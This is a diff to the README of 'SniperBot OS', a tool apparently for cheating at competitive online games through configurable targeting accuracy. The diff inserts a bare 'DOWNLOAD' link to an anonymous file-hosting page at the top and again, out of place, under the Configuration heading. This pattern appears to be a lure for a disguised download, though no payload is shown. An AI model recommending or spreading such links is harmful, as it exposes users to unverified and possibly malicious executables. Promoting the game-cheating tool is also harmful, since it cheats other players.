@@ -1,5 +1,5 @@
 # SniperBot OS
-
+   -  [DOWNLOAD](https://gofile.io/d/cyVxNq)
 ![Version](https://img.shields.io/badge/version-1.0-blue.svg)
 ![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)
 ![License](https://img.shields.io/badge/license-MIT-blue.svg)
@@ -29,6 +29,7 @@ SniperBot OS is your ultimate ally in the high-stakes world of competitive onlin
    - After installation, you can start SniperBot OS from the Start Menu or by double-clicking the desktop shortcut.
 
 ## Configuration
+   -  [DOWNLOAD](https://gofile.io/d/cyVxNq)
 
 - **targeting**:
     - `accuracy`: Set the accuracy level to high, medium, or low.
